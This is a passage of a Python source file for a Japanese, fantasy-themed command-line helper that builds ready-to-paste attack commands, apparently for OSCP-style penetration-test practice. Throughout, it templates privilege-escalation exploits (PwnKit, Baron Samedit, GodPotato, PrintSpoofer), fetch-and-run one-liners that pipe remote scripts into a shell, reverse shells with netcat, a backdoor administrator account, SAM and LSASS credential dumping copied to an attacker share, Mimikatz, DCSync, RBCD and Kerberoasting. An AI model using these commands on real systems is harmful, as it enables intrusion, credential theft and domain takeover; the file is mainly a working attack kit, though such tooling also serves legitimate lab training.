         "cmd":   f"wget -qO- http://{s['kali_ip']}/pwnkit.py | python3",
         "note":  "ディスクに書かずメモリ上で直接実行"},
        {"title": "ネットから直接ダウンロード",
         "cmd":   "wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py && python3 CVE-2021-4034.py",
         "note":  "インターネット接続があればGitHubから直接取得"},
    ]
    return "CVE-2021-4034  pwnkit", steps

def spell_baron(s):
    steps = [
        {"title": "Step 1 - gcc / make の確認",
         "cmd":   "which gcc && which make",
         "note":  "コンパイルに必要なツールが揃っているか確認"},
        {"title": "Step 2 - ファイルを固める (自分側)",
         "cmd":   "tar -cvzf baron.tar.gz *",
         "note":  "エクスプロイトファイル一式をアーカイブ"},
        {"title": "Step 3 - ターゲットにダウンロード",
         "cmd":   f"wget http://{s['kali_ip']}/baron.tar.gz",
         "note":  "ターゲット側で実行"},
        {"title": "Step 4 - 解凍",
         "cmd":   "tar -xvzf baron.tar.gz",
         "note":  "アーカイブを展開"},
        {"title": "Step 5 - コンパイル",
         "cmd":   "make",
         "note":  "ターゲット環境でネイティブコンパイル"},
        {"title": "Step 6 - ターゲットリスト確認",
         "cmd":   "./sudo-hax-me-a-sandwich",
         "note":  "OS バージョンに対応する番号を確認"},
        {"title": "Step 7 - OS バージョン確認",
         "cmd":   "cat /etc/os-release",
         "note":  "ディストリビューションとバージョンを確認"},
        {"title": "Step 8 - 番号を指定して実行 (例:1)",
         "cmd":   "./sudo-hax-me-a-sandwich 1",
         "note":  "リストの番号を指定して実行"},
        {"title": "OS がリストにない場合",
         "cmd":   "chmod +x brute.sh && ./brute.sh",
         "note":  "ブルートフォースで offset を探す"},
    ]
    return "CVE-2021-3156  Baron Samedit", steps

def spell_rds(s):
    steps = [
        {"title": "Step 1 - 自分側でサーバー起動",
         "cmd":   f"cd ~/shells/c && sudo python3 -m http.server 80",
         "note":  "rds.c を配信するHTTPサーバーを起動"},
        {"title": "Step 2 - ターゲットにダウンロード",
         "cmd":   f"wget http://{s['kali_ip']}/rds.c",
         "note":  "ターゲット側で実行"},
        {"title": "Step 3 - コンパイル",
         "cmd":   "gcc rds.c -o rds",
         "note":  "ターゲットでコンパイル"},
        {"title": "Step 4 - 実行権限付与",
         "cmd":   "chmod +x rds",
         "note":  "実行可能にする"},
        {"title": "Step 5 - 実行",
         "cmd":   "./rds",
         "note":  "ローカル特権昇格を実行"},
    ]
    return "RDS ローカル特権昇格", steps

# esc
def spell_pe(s):
    wh = s.get("win_home", r"C:\Users\Public\homedir")
    steps = [
        {"title": "インメモリ実行",
         "cmd":   f'powershell.exe iex "(iwr -UseBasicParsing http://{s["kali_ip"]}/PE-Audit.ps1)"',
         "note":  "ディスクに書かずメモリ上で PowerShell スクリプトを実行"},
        {"title": "ファイルを落として実行",
         "cmd":   f"certutil.exe -urlcache -split -f http://{s['kali_ip']}/PE-Audit.ps1 {wh}\\PE-Audit.ps1",
         "note":  "certutil でダウンロードしてから実行"},
        {"title": "PE-Audit.ps1 を実行",
         "cmd":   f"powershell.exe -ExecutionPolicy Bypass -File {wh}\\PE-Audit.ps1",
         "note":  "権限昇格の可能性がある設定を網羅的に列挙"},
    ]
    return "PE-Audit.ps1", steps

def spell_lse(s):
    steps = [
        {"title": "ファイルあり",
         "cmd":   f"wget http://{s['kali_ip']}/lse.sh -O /dev/shm/lse.sh && chmod +x /dev/shm/lse.sh && /dev/shm/lse.sh -l 1",
         "note":  "lse.sh をダウンロードして実行。-l 1 で詳細出力"},
        {"title": "オンメモリ",
         "cmd":   f"wget -qO- http://{s['kali_ip']}/lse.sh | bash -s -- -l 1",
         "note":  "ダウンロードせずパイプで直接実行"},
    ]
    return "lse.sh", steps

def spell_les(s):
    steps = [
        {"title": "ファイルあり",
         "cmd":   f"wget http://{s['kali_ip']}/linux-exploit-suggester.sh -O /dev/shm/les.sh && chmod +x /dev/shm/les.sh && /dev/shm/les.sh",
         "note":  "カーネルバージョンに対応するエクスプロイト候補を表示"},
        {"title": "オンメモリ",
         "cmd":   f"wget -qO- http://{s['kali_ip']}/linux-exploit-suggester.sh | bash",
         "note":  "パイプで直接実行するワンライナー"},
    ]
    return "linux-exploit-suggester", steps

def spell_potato(s):
    wh = s.get("win_home", r"C:\Users\Public\homedir")
    steps = [
        {"title": "Step 1 - .NET バージョン確認",
         "cmd":   r"dir C:\Windows\Microsoft.NET\Framework",
         "note":  "v4.0.xxxx → NET4版  /  v2.0.xxxx → NET2版"},
        {"title": "Step 2 - 作業ディレクトリ作成",
         "cmd":   f"mkdir {wh}",
         "note":  "ダウンロード先フォルダを作成"},
        {"title": "Step 3 - certutil で NET4 版ダウンロード",
         "cmd":   f"certutil.exe -urlcache -split -f http://{s['kali_ip']}/GodPotato-NET4.exe {wh}\\gp4.exe",
         "note":  "NET4 版 GodPotato を gp4.exe として保存"},
        {"title": "Step 3 (alt) - certutil で NET2 版ダウンロード",
         "cmd":   f"certutil.exe -urlcache -split -f http://{s['kali_ip']}/GodPotato-NET2.exe {wh}\\gp2.exe",
         "note":  "NET2 版 GodPotato を gp2.exe として保存"},
        {"title": "Step 4 - 動作確認",
         "cmd":   f".\\gp4.exe -cmd \"whoami\"",
         "note":  "NT AUTHORITY\\SYSTEM と表示されれば成功"},
        {"title": "Step 5 - nc.exe をダウンロード",
         "cmd":   f"certutil.exe -urlcache -split -f http://{s['kali_ip']}/nc.exe {wh}\\nc.exe",
         "note":  "リバースシェル用の netcat を配置"},
        {"title": "Step 6 - 待ち受け (自分側)",
         "cmd":   f"rlwrap -cAr nc -lvnp {s['kali_port']} -s {s['kali_ip']}",
         "note":  "Kali 側でリバースシェルの接続を待機"},
        {"title": "Step 7 - リバースシェル (ターゲット)",
         "cmd":   f".\\gp4.exe -cmd \"{wh}\\nc.exe -e cmd.exe {s['kali_ip']} {s['kali_port']}\"",
         "note":  "SYSTEM 権限でリバースシェルを送信"},
        {"title": "アカウント作成 (リバースシェルなし)",
         "cmd":   r".\gp4.exe -cmd \"net user attacker Password123! /add\"",
         "note":  "攻撃者アカウントをローカルに作成"},
        {"title": "管理者グループに追加",
         "cmd":   r".\gp4.exe -cmd \"net localgroup administrators attacker /add\"",
         "note":  "作成したアカウントを管理者に昇格"},
    ]
    return "GodPotato  SeImpersonatePrivilege", steps

def spell_print(s):
    wh = s.get("win_home", r"C:\Users\Public\homedir")
    target_user = get_input("ローカルグループ追加対象ユーザー", s["me"])
    steps = [
        {"title": "PrintSpoofer ダウンロード",
         "cmd":   f"certutil.exe -urlcache -split -f http://{s['kali_ip']}/PrintSpoofer64.exe {wh}\\ps.exe",
         "note":  "PrintSpoofer を ps.exe として保存"},
        {"title": "現在のシェルを昇格",
         "cmd":   f"{wh}\\ps.exe -i -c cmd.exe",
         "note":  "現在のプロセスを SYSTEM に昇格して cmd を起動"},
        {"title": "リバースシェル",
         "cmd":   f"{wh}\\ps.exe -c \"C:\\Windows\\System32\\cmd.exe /c {wh}\\nc.exe {s['kali_ip']} {s['kali_port']} -e cmd.exe\"",
         "note":  "SYSTEM 権限でリバースシェルを送信"},
        {"title": f"{target_user} を Administrators に追加",
         "cmd":   f"{wh}\\ps.exe -c \"cmd.exe /c net localgroup Administrators {target_user} /add\"",
         "note":  "指定ユーザーをローカル管理者グループに追加"},
        {"title": "追加確認",
         "cmd":   "net localgroup Administrators",
         "note":  "管理者グループのメンバーを確認"},
    ]
    return "PrintSpoofer  SeImpersonatePrivilege", steps

def spell_cap(s):
    steps = [
        {"title": "Capabilities 確認",
         "cmd":   "getcap -r / 2>/dev/null",
         "note":  "全ファイルの Linux Capabilities を再帰的に探索"},
        {"title": "python3 に cap_setuid がある場合",
         "cmd":   "/usr/bin/python3.10 -c 'import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
         "note":  "cap_setuid を使って UID を 0 に設定し root shell を取得"},
    ]
    return "Linux Capabilities 悪用", steps

def spell_regsave(s):
    wh = s.get("win_home", r"C:\Users\Public\homedir")
    steps = [
        {"title": "【ターゲット】作業フォルダ作成",
         "cmd":   f"mkdir {wh}",
         "note":  "SAM ダンプを保存するフォルダをターゲット Windows 上で作成"},
        {"title": "【ターゲット】SAM ハイブ保存",
         "cmd":   f"reg save HKLM\\SAM {wh}\\sam.bak",
         "note":  "SAM ハイブ (ローカルアカウントのハッシュ) をファイルに保存"},
        {"title": "【ターゲット】SYSTEM ハイブ保存",
         "cmd":   f"reg save HKLM\\SYSTEM {wh}\\system.bak",
         "note":  "SYSTEM ハイブ (SAM の暗号化キー) を保存"},
        {"title": "【ターゲット】SECURITY ハイブ保存",
         "cmd":   f"reg save HKLM\\SECURITY {wh}\\security.bak",
         "note":  "SECURITY ハイブ (ドメインキャッシュ等) を保存"},
        {"title": "【Kali】SMB 共有を立てる",
         "cmd":   "sudo impacket-smbserver share . -smb2support -user user1 -password pass123",
         "note":  "Kali のカレントディレクトリを SMB 共有として公開"},
        {"title": "【ターゲット】SMB 共有をマウント",
         "cmd":   f"net use \\\\{s['kali_ip']}\\share /user:user1 pass123",
         "note":  "Kali の SMB 共有をターゲットにマウント"},
        {"title": "【ターゲット】sam.bak を転送",
         "cmd":   f"copy \"{wh}\\sam.bak\" \\\\{s['kali_ip']}\\share\\",
         "note":  "SAM ファイルを Kali に送信"},
        {"title": "【ターゲット】system.bak を転送",
         "cmd":   f"copy \"{wh}\\system.bak\" \\\\{s['kali_ip']}\\share\\",
         "note":  "SYSTEM ファイルを Kali に送信"},
        {"title": "【ターゲット】security.bak を転送",
         "cmd":   f"copy \"{wh}\\security.bak\" \\\\{s['kali_ip']}\\share\\",
         "note":  "SECURITY ファイルを Kali に送信"},
        {"title": "【Kali】ハッシュ抽出",
         "cmd":   "impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL",
         "note":  "3つのハイブからローカルアカウントの NTLM ハッシュを抽出"},
    ]
    return "レジストリ SAM ダンプ", steps

# lateral
def spell_ligolo(s):
    steps = [
        {"title": "【準備】既存インターフェースを削除  ·  Device busy エラー対策",
         "cmd":   "sudo ip link delete ligolo 2>/dev/null; true",
         "note":  "すでに ligolo が存在する場合のクリーニング。エラーは無視してOK"},
        {"title": "Step 1 - TUN インターフェース作成",
         "cmd":   "sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up",
         "note":  "Kali に仮想NICを作る。トンネルの入口"},
        {"title": "Step 2 - Proxy 起動 (自分側)",
         "cmd":   "sudo ./proxy -selfcert -laddr 0.0.0.0:443",
         "note":  "Ligolo proxy をポート443で起動。自己署名証明書を使用"},
        {"title": "Step 3a - agent.exe を公開",
         "cmd":   "sudo python3 -m http.server 80",
         "note":  "ターゲットにダウンロードさせるため agent.exe を配信"},
        {"title": "Step 3b - ターゲットにダウンロード",
         "cmd":   f"certutil -urlcache -split -f http://{s['kali_ip']}/agent.exe agent.exe",
         "note":  "ターゲット Windows 側で実行。agent.exe をダウンロード"},
        {"title": "Step 4 - ターゲット側から接続",
         "cmd":   f".\\agent.exe -connect {s['kali_ip']}:443 -ignore-cert",
         "note":  "エージェントが Kali の proxy に接続を開始"},
        {"title": "Step 5 - セッション選択 (proxy 画面で)",
         "cmd":   "session",
         "note":  "proxy の対話画面でセッションを選択"},
        {"title": "Step 5 - トンネル開通 (proxy 画面で)",
         "cmd":   "start",
         "note":  "トンネルを開通させる"},
        {"title": "Step 6 - ルーティング追加",
         "cmd":   "sudo ip route add 172.16.XX.0/24 dev ligolo",
         "note":  "ターゲットネットワークへのルートを追加。サブネットは環境に合わせて変更"},
        {"title": "片付け",
         "cmd":   "sudo ip link delete ligolo",
         "note":  "ルーティングも自動で消える"},
    ]
    return "Ligolo-ng トンネリング", steps

def spell_chisel(s):
    steps = [
        {"title": "Step 1 - chisel.exe を公開",
         "cmd":   "sudo python3 -m http.server 80",
         "note":  "chisel.exe を配信するHTTPサーバーを起動"},
        {"title": "Step 2 - ターゲットにアップロード",
         "cmd":   f"certutil -urlcache -split -f http://{s['kali_ip']}/chisel.exe chisel.exe",
         "note":  "certutil でターゲットにダウンロード"},
        {"title": "Step 3 - 自分側で待ち受け",
         "cmd":   "chisel server -p 8001 --reverse",
         "note":  "Kali 側でリバース SOCKS プロキシを待ち受け"},
        {"title": "Step 4 - ターゲット側で接続",
         "cmd":   f".\\chisel.exe client {s['kali_ip']}:8001 R:socks",
         "note":  "ターゲットからリバース接続して SOCKS5 トンネルを確立"},
    ]
    return "Chisel ポートフォワーディング", steps

def spell_mimi(s):
    wh = s.get("win_home", r"C:\Users\Public\homedir")
    steps = [
        {"title": "Step 1 - LSASS PID 確認",
         "cmd":   "powershell.exe Get-Process lsass",
         "note":  "LSASS プロセスの PID を取得する"},
        {"title": "Step 2 - LSASS ダンプ",
         "cmd":   f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $PID {wh}\\lsass.dmp full",
         "note":  "LSASS プロセスのメモリを転写。認証情報が含まれている"},
        {"title": "Step 3a - SMB 共有を立てる (自分側)",
         "cmd":   "sudo impacket-smbserver share . -smb2support -user user1 -password pass123",
         "note":  "Kali のカレントディレクトリを SMB 共有として公開"},
        {"title": "Step 3b - 共有をマウント (ターゲット)",
         "cmd":   f"net use \\\\{s['kali_ip']}\\share /user:user1 pass123",
         "note":  "Kali の SMB 共有をターゲットにマウント"},
        {"title": "Step 3c - ダンプを転送 (ターゲット)",
         "cmd":   f"copy \"{wh}\\lsass.dmp\" \\\\{s['kali_ip']}\\share\\",
         "note":  "LSASS ダンプファイルを Kali に転送"},
        {"title": "Step 4 - ハッシュ抽出 (Kali)",
         "cmd":   "pypykatz lsa minidump lsass.dmp | grep -E 'username|password|NTLM' | awk '{print $NF}' | sed 'N;N;s/\\n/ : /g'",
         "note":  "pypykatz でダンプからユーザー名・パスワード・NTLMハッシュを抽出"},
        {"title": "バイナリ Mimikatz - ダウンロード",
         "cmd":   f"certutil.exe -urlcache -split -f http://{s['kali_ip']}/mimikatz.exe {wh}\\mimi.exe",
         "note":  "mimikatz.exe を mimi.exe として保存"},
        {"title": "バイナリ Mimikatz - 実行",
         "cmd":   f"{wh}\\mimi.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
         "note":  "debug 権限を取得してから認証情報を抽出"},
    ]
    return "Mimikatz / PyPyKatz", steps

# ad
def spell_genericall(s):
    pv_url = f"IEX(New-Object Net.WebClient).DownloadString('http://{s['kali_ip']}:{s['kali_port']}/PowerView.ps1')"
    print(f"  {C_MIST}対象の性質を教えてほしい。{C_RESET}")
    t_type = input(_rl(f"  {C_LOTUS}✧ {C_SILVER}User or Group? {C_SKY}(u/g){C_LOTUS} ➯ {C_RESET}")).strip().lower()
    if t_type == "g":
        target = get_input("Target Group Name", "Domain Admins")
        steps  = [{"title": "群れへの導き (Add Member)",
                   "cmd":   f"{pv_url}; Add-DomainGroupMember -Identity '{target}' -Members '{s['me']}' -Domain '{s['domain']}'; Get-DomainGroupMember -Identity '{target}' | select MemberName",
                   "note":  "PowerView で自分をグループに追加して確認"}]
        return "GenericAll → AddMember", steps
    else:
        target = get_input("Target User Name", "Administrator")
        new_pw = get_input("New Password", "Password123!")
        steps  = [
            {"title": "記憶の上書き (PowerView)",
             "cmd":   f"{pv_url}; Set-DomainUserPassword -Identity '{target}' -AccountPassword (ConvertTo-SecureString '{new_pw}' -AsPlainText -Force)",
             "note":  "PowerView でターゲットユーザーのパスワードを強制変更"},
            {"title": "他国の術式 (Net RPC)",
             "cmd":   f"net rpc password '{target}' '{new_pw}' -U '{s['domain']}'/'{s['me']}'%'{s['my_pw']}' -S {s['dc_ip']}",
             "note":  "Kali の net rpc コマンドでパスワード変更"},
            {"title": "他国の術式 (NetExec)",
             "cmd":   f"nxc smb {s['dc_ip']} -u '{s['me']}' -p '{s['my_pw']}' -d {s['domain']} --set-password '{new_pw}'",
             "note":  "NetExec でパスワード変更"},
            {"title": "新たな依代への潜入",
             "cmd":   f"evil-winrm -i {s['dc_ip']} -u '{target}' -p '{new_pw}'",
             "note":  "変更したパスワードで新しいユーザーとしてログイン"},
        ]
        return "GenericAll → ForceChangePassword", steps

def spell_addmember(s):
    pv_url = f"IEX(New-Object Net.WebClient).DownloadString('http://{s['kali_ip']}:{s['kali_port']}/PowerView.ps1')"
    target = get_input("Target Group Name", "Domain Admins")
    steps = [
        {"title": "グループにメンバーを追加 (PowerView)",
         "cmd":   f"{pv_url}; Add-DomainGroupMember -Identity '{target}' -Members '{s['me']}' -Domain '{s['domain']}'",
         "note":  "自分のアカウントを指定グループに追加する"},
        {"title": "メンバー追加確認",
         "cmd":   f"{pv_url}; Get-DomainGroupMember -Identity '{target}' | select MemberName",
         "note":  "グループのメンバーを確認して追加が成功しているか検証"},
    ]
    return "グループメンバー追加", steps

def spell_writedacl(s):
    dc_path = "DC=" + s["domain"].replace(".", ",DC=")
    pv_url  = f"IEX(New-Object Net.WebClient).DownloadString('http://{s['kali_ip']}:{s['kali_port']}/PowerView.ps1')"
    steps   = [{"title": "深淵の共鳴 (WriteDACL → DCSync)",
                "cmd":   (f"{pv_url}; Add-DomainObjectAcl -TargetIdentity '{dc_path}' -PrincipalIdentity '{s['me']}' "
                          f"-Rights DCSync; Get-DomainObjectAcl -Identity '{dc_path}' | "
                          f"?{{$_.SecurityIdentifier -match (Get-DomainUser {s['me']}).objectsid}}"),
                "note":  "自分に DCSync 権限を付与してから確認する"}]
    return "WriteDACL", steps

def spell_genericwrite(s):
    pv_url = f"IEX(New-Object Net.WebClient).DownloadString('http://{s['kali_ip']}:{s['kali_port']}/PowerView.ps1')"
    target = get_input("Target User/Computer")
    steps  = [
        {"title": "偽りの称号 (SPN 設定)",
         "cmd":   f"{pv_url}; Set-DomainObject -Identity '{target}' -Set @{{serviceprincipalname='fake/service'}}; Get-DomainUser '{target}' -Properties serviceprincipalname",
         "note":  "ターゲットに偽の SPN を設定してKerberoastable にする"},
        {"title": "Kerberoasting (NetExec)",
         "cmd":   f"nxc ldap {s['dc_ip']} -u '{s['me']}' -p '{s['my_pw']}' --kerberoasting output.txt",
         "note":  "SPN 持ちユーザーの TGS ハッシュを取得"},
        {"title": "Kerberoasting (Impacket)",
         "cmd":   f"impacket-GetUserSPNs {s['domain']}/{s['me']}:'{s['my_pw']}' -dc-ip {s['dc_ip']} -request",
         "note":  "Impacket で TGS ハッシュをリクエスト"},
    ]
    return "GenericWrite → Kerberoasting", steps

def spell_rbcd(s):
    dc_path = "DC=" + s["domain"].replace(".", ",DC=")
    pv_url  = f"IEX(New-Object Net.WebClient).DownloadString('http://{s['kali_ip']}:{s['kali_port']}/PowerView.ps1')"
    pm_url  = f"IEX(New-Object Net.WebClient).DownloadString('http://{s['kali_ip']}:{s['kali_port']}/Powermad.ps1')"
    target_netbios = get_input("Target NetBIOS Name", "DC")
    target_fqdn    = f"{target_netbios}.{s['domain']}"
    print(f"\n  {C_SKY}Quota 確認:{C_RESET}")
    print(f"  {pv_url}; Get-DomainObject -Identity '{dc_path}' | select ms-DS-MachineAccountQuota\n")
    ans = input(_rl(f"  {C_LOTUS}  ? Quota > 0 ？ (y/n): {C_RESET}")).lower()
    if ans != "y":
        print(f"\n  {C_GOLD}[!] 器が枯渇しているみたい。既存の依代が必要だね。{C_RESET}\n")
        return None
    fake_pc     = get_input("New Computer Name", "SERVICEA")
    fake_pw     = get_input("New Computer Password", "123456")
    ccache_file = f"Administrator@cifs_{target_fqdn}@{s['domain'].upper()}.ccache"
    steps = [
        {"title": "Step 1 - Quota 確認",
         "cmd":   f"{pv_url}; Get-DomainObject -Identity '{dc_path}' | select ms-DS-MachineAccountQuota",
         "note":  "Quota > 0 であること。0の場合は新規コンピューター追加不可"},
        {"title": "Step 2 - 偽コンピューター作成 + RBCD 設定",
         "cmd":   (f"{pv_url}; {pm_url}; "
                   f"New-MachineAccount -MachineAccount {fake_pc} -Password (ConvertTo-SecureString '{fake_pw}' -AsPlainText -Force); "
                   f"$ComputerSid = (Get-DomainComputer {fake_pc} -Properties objectsid).objectsid; "
                   f"$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"; "
                   f"$SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); "
                   f"Get-DomainComputer {target_netbios} | Set-DomainObject -Set @{{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}}; "
                   f"Get-DomainComputer '{target_netbios}' -Properties 'msds-allowedtoactonbehalfofotheridentity'"),
         "note":  "偽コンピューターを作成してターゲットの RBCD に設定する"},
        {"title": "Step 3 - チケット取得",
         "cmd":   f"impacket-getST -dc-ip {s['dc_ip']} '{s['domain']}/{fake_pc}$:{fake_pw}' -spn 'cifs/{target_fqdn}' -impersonate Administrator",
         "note":  "偽コンピューターとして Administrator を偽装したチケットを取得"},
        {"title": "Step 4 - 環境変数をセット",
         "cmd":   f"export KRB5CCNAME={ccache_file}",
         "note":  "Kerberos チケットキャッシュのパスを環境変数に設定"},
        {"title": "Step 5 - 扉を開く",
         "cmd":   f"impacket-psexec -k -no-pass {target_fqdn}",
         "note":  "チケットを使って PSExec で SYSTEM シェルを取得"},
    ]
    return "RBCD 委任攻撃", steps

def spell_dcsync(s):
    target_user = get_input("Target User to Dump", "Administrator")
    steps = [{"title": "魂の写記 (DCSync)",
              "cmd":   f"lsadump::dcsync /domain:{s['domain']} /user:{target_user}",
              "note":  "mimikatz 内で実行。DC を模倣してユーザーのハッシュを抽出"}]
    return "DCSync", steps

def spell_readgmsap(s):
    target_object = get_input("Target Object Dump", "svc_apache$")
    steps = [{"title": "gMSA パスワード読取",
              "cmd":   f"bloodyAD --host '{s['dc_ip']}' -d {s['domain']} -u '{s['me']}' -p '{s['my_pw']}' get object {target_object} --attr msDS-ManagedPassword",
              "note":  "gMSA アカウントの管理パスワードをブロブとして読み取る"}]
    return "ReadGMSAPassword", steps

def spell_kerb(s):
    steps = [
        {"title": "SPN 持ちユーザーの探索  ·  Kerberoastable ユーザーを特定",
         "cmd":   f"impacket-GetUserSPNs -dc-ip {s['dc_ip']} '{s['domain']}/{s['me']}:{s['my_pw']}' -request",
         "note":  "TGS ハッシュを取得する。-request で即取得"},
        {"title": "NetExec 版  ·  別の詠唱",
         "cmd":   f"nxc ldap {s['dc_ip']} -u '{s['me']}' -p '{s['my_pw']}' --kerberoasting output.txt",
         "note":  "output.txt にハッシュが書き出される"},
        {"title": "ハッシュクラック  ·  封印を解く",
         "cmd":   "hashcat -a 0 -m 13100 output.txt /usr/share/wordlists/rockyou.txt",
         "note":  "または: john --wordlist=/usr/share/wordlists/rockyou.txt output.txt"},
    ]
    return "Kerberoasting", steps

# ── スペルディスパッチ ────────────────────────────────────────────────
SPELL_HANDLERS = {
    "genericall":    spell_genericall,
    "pass":          spell_genericall,
    "forcechangepassword": spell_genericall,
    "addmember":     spell_addmember,
    "writedacl":     spell_writedacl,
    "genericwrite":  spell_genericwrite,
    "writeproperty": spell_genericwrite,
    "rbcd":          spell_rbcd,
    "dcsync":        spell_dcsync,
    "readgmsap":     spell_readgmsap,
    "kerb":          spell_kerb,
    "winrm":         spell_winrm,
    "psexec":        spell_psexec,
    "rdp":           spell_rdp,
    "ssh":           spell_ssh,
    "bh":            spell_bh,
    "smb":           spell_smb,
    "ldapbook":      spell_ldapbook,
    "pwnkit":        spell_pwnkit,
    "baron":         spell_baron,
    "rds":           spell_rds,
    "pe":            spell_pe,
    "lse":           spell_lse,
    "les":           spell_les,
    "potato":        spell_potato,
    "print":         spell_print,
    "cap":           spell_cap,
    "regsave":       spell_regsave,
    "ligolo":        spell_ligolo,
    "chisel":        spell_chisel,
    "mimi":          spell_mimi,
}

# ── ヘルプ定義 ────────────────────────────────────────────────────────
_HELP_MAIN = [
    ("show",    "変数確認"),
    ("edit",    "変数編集"),
    ("set",     "対話型一括編集"),
    ("ls",      "ドメイン/術式一覧"),
    ("cd",      "ドメイン移動"),
    ("slot",    "スロット管理"),
    ("task",    "タスク管理"),
    ("save",    "セーブ (差分プレビュー付き)"),
    ("export",  "JSON エクスポート"),
    ("spell",   "カスタム呪文管理 (~/.faver/spells/)"),
    ("clear",   "画面クリア"),
    ("exit",    "終了"),
]
_HELP_EDIT = [
    ("/user [v]",      "ユーザー名を編集"),
    ("/pass [v]",      "パスワードを編集"),
    ("/ip [v]",        "ターゲット IP を編集"),
    ("/kali [v]",      "Kali IP を編集"),
    ("/port [v]",      "Kali ポートを編集"),
    ("/ntlm [v]",      "NTLM ハッシュを編集"),
    ("/domain [v]",    "ドメイン名を編集"),
    ("/ns [v]",        "NS IP (ネームサーバー) を編集"),
    ("/winhome [v]",   "Windows 作業フォルダを編集"),
    ("list",           "現在値を一覧表示"),
]
_HELP_LS = [
    ("ls",           "現在地のコンテンツを表示"),
    ("ls <domain>",  "指定ドメインの術式一覧"),
    ("ls ../",       "ドメイン一覧に戻る"),
    ("cd <domain>",  "ドメインに入る"),
    ("cd ..",        "ホームに戻る"),
    ("cd ../enum",   "ホームを経由して enum ドメインへ"),
]
_HELP_SLOT = [
    ("slot",         "現在のスロット詳細"),
    ("slot add .",   "現在の状態をスロット保存"),
    ("slot list",    "スロット一覧"),
    ("slot use <n>", "スロットをロード (番号 or 名前)"),
]
_HELP_TASK = [
    ("task",            "タスク一覧"),
    ("task add <text>", "タスクを追加"),
    ("task fin <n>",    "完了マーク ✿"),
    ("task del <n>",    "削除"),
    ("task edit <n>",   "編集 (プレースホルダー付き)"),
]
_HELP_SPELL = [
    ("spell",              "カスタム呪文一覧"),
    ("spell list",         "カスタム呪文一覧"),
    ("spell new",          "新規呪文ウィザード"),
    ("spell edit <name>",  "呪文を編集"),
    ("spell del <name>",   "呪文を削除"),
    ("spell preview <n>",  "プレビュー実行"),
]

# ── メインループ ──────────────────────────────────────────────────────
def faber_ui():
    print(fr"""
    {C_SKY}          .  {C_WHITE}✧{C_SKY}  .
    {C_SILVER}    ─────────────── {C_LOTUS}𝔽 𝔸 𝔹 𝔼 ℝ{C_SILVER} ───────────────
    {C_MIST}      "The journey to find where the souls rest"
    {C_LOTUS}    ──────────────────────────────────────────{C_RESET}""")

    state = {
        "me":        "Eric.Wallows",
        "my_pw":     "EricLikesRunning800",
        "domain":    "oscp.exam",
        "dc_ip":     "10.10.10.10",
        "kali_ip":   "10.10.10.11",
        "kali_port": "4444",
        "ntlm":      "",
        "ns_ip":     "",
        "win_home":  r"C:\Users\Public\homedir",
    }
    slots             = []
    tasks             = []
    next_task_id      = 1
    current_domain    = None
    current_slot_name = None

    loaded = load_save()
    if loaded:
        state.update(loaded.get("state", {}))
        # Ensure new keys exist even in old saves
        state.setdefault("ns_ip",    "")
        state.setdefault("win_home", r"C:\Users\Public\homedir")
        slots             = loaded.get("slots", [])
        tasks             = loaded.get("tasks", [])
        next_task_id      = loaded.get("meta", {}).get("next_task_id", 1)
        current_slot_name = loaded.get("meta", {}).get("active_slot") or None
        print(f"  {C_GREEN}✦ {SAVE_FILE} からロードしたよ。{C_RESET}")

    # Load custom spells and build active_handlers
    CUSTOM_SPELLS   = load_custom_spells()
    active_handlers = dict(SPELL_HANDLERS)
    for nm, sp in CUSTOM_SPELLS.items():
        active_handlers[nm] = make_custom_handler(sp)

    while True:
        slot_tag   = f" {C_DIM}[{current_slot_name}]{C_RESET}" if current_slot_name else ""
        domain_tag = f" {C_GOLD}[{current_domain}]{C_RESET}"   if current_domain    else ""
        print(f"\n  {C_LOTUS}❀ {C_SILVER}{state['me']}@{state['domain']} {C_LOTUS}| {C_SILVER}IP: {C_WHITE}{state['dc_ip']}{slot_tag}{C_RESET}")
        try:
            raw = input(_rl(f"{C_SKY}  Mana Trace{domain_tag}{C_SKY} ❯ {C_RESET}")).strip()
        except EOFError:
            break
        if not raw:
            continue

        parts = raw.split()
        cmd   = parts[0].lower()

        # ── 基本 ──────────────────────────────────────────────────────
        if cmd == "exit":
            print(f"  {C_MIST}またね。旅の終わりまで。{C_RESET}")
            break
        elif cmd == "clear":
            print("\033[H\033[J")
            continue

        # ── show ──────────────────────────────────────────────────────
        elif cmd == "show":
            print(f"\n  {C_DIM}スロット: {current_slot_name or '(未選択)'}{C_RESET}")
            show_kv("記憶の書", [
                ("1", "user",          state["me"]),
                ("2", "password",      state["my_pw"]),
                ("3", "domain",        state["domain"]),
                ("4", "target ip",     state["dc_ip"]),
                ("5", "kali ip",       state["kali_ip"]),
                ("6", "kali port",     state["kali_port"]),
                ("7", "ntlm",          state["ntlm"] or "(未設定)"),
                ("8", "ns ip",         state.get("ns_ip") or "(未設定)"),
                ("9", "win home",      state.get("win_home", "")),
            ])

        # ── edit ──────────────────────────────────────────────────────
        elif cmd == "edit":
            sub = parts[1].lower() if len(parts) >= 2 else ""
            if not sub or sub == "help":
                show_list("edit ヘルプ", _HELP_EDIT)
                print(f"  {C_DIM}[v] 省略時はプレースホルダー付き対話型で編集{C_RESET}\n")
            elif sub == "list":
                show_edit_list(state)
            elif sub in EDIT_KEYS:
                sk, desc = EDIT_KEYS[sub]
                if len(parts) < 3:
                    value = get_input_edit(desc, state.get(sk, ""))
                else:
                    value = strip_quotes(raw.split(None, 2)[2])
                state[sk]         = value
                current_slot_name = None
                print(f"  {C_GREEN}✓ {desc} → {C_WHITE}{value}{C_RESET}\n")
            else:
                print(f"  {C_GOLD}[!] 不明なオプション: {sub}  →  edit help で確認{C_RESET}\n")

        # ── set ───────────────────────────────────────────────────────
        elif cmd == "set":
            print(f"  {C_GOLD}── 解き放たれた記憶の再構成 ──{C_RESET}")
            state["me"]        = get_input_edit("Account Name",  state["me"])
            state["my_pw"]     = get_input_edit("Password",      state["my_pw"])
